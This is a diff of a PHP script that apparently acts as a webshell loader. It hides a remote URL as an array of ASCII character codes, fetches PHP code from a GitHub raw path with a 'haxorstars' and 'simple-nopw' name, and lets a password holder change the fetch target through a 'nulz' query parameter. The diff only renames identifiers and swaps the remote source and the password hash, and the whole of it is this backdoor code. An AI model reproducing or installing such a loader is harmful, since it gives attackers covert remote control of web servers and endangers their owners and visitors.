@@ -1,5 +1,6 @@
 <?php session_start();
-function kontol($url)
+#pl1l1k1kom
+function NuLzGG($url)
 {
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
@@ -8,27 +9,27 @@ function kontol($url)
     curl_close($ch);
     return $result;
 }
-$asciiArray = [104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 78, 111, 111, 98, 84, 101, 99, 104, 111, 47, 119, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 99, 101, 46, 112, 104, 112];
+$asciiArray = [104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 104, 97, 120, 111, 114, 115, 116, 97, 114, 115, 47, 97, 114, 99, 104, 105, 118, 101, 47, 109, 97, 105, 110, 47, 115, 105, 109, 112, 108, 101, 47, 115, 105, 109, 112, 108, 101, 45, 110, 111, 112, 119, 46, 112, 104, 112];
 $decodedString = '';
 foreach ($asciiArray as $ascii) {
     $decodedString .= chr($ascii);
 }
 $url = $decodedString;
-$correct_password = '$2y$10$TGT36epmgr3/fTZ.XPB9nuXbKG5GcQYw/P3gFs4F7kIRflxBIWRAS';
-if (isset($_GET['ts_reset'])) {
-    $_SESSION["ts_url"] = "";
+$correct_password = '$2y$10$6VDjbpAEhu.N9no7h.KtGO29fwnXMN0byteFNEs5L9sXdqNRU6gai';
+if (isset($_GET['nulz_reset'])) {
+    $_SESSION["nulz_url"] = "";
     echo "success";
     exit;
 }
-if (isset($_GET['ts'])) {
+if (isset($_GET['nulz'])) {
     if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         if (isset($_POST['password'])) {
             $provided_password = $_POST['password'];
             if (password_verify($provided_password, $correct_password)) {
                 if (isset($_POST['url'])) {
                     $url = $_POST['url'];
-                    $_SESSION["ts_url"] = $url;
-                    echo "updated : " . $_SESSION["ts_url"];
+                    $_SESSION["nulz_url"] = $url;
+                    echo "updated : " . $_SESSION["nulz_url"];
                     exit;
                 } else {
                     echo "Error!";
@@ -83,15 +84,15 @@ if (isset($_GET['ts'])) {
         <?php exit;
     }
 } else {
-    if (empty($_SESSION["ts_url"])) {
+    if (empty($_SESSION["nulz_url"])) {
         $result = @file_get_contents($url);
         if (empty($result)) {
-            $result = kontol($url);
+            $result = NuLzGG($url);
         }
     } else {
-        $result = @file_get_contents($_SESSION["ts_url"]);
+        $result = @file_get_contents($_SESSION["nulz_url"]);
         if (empty($result)) {
-            $result = kontol($_SESSION["ts_url"]);
+            $result = NuLzGG($_SESSION["nulz_url"]);
         }
     }
 }
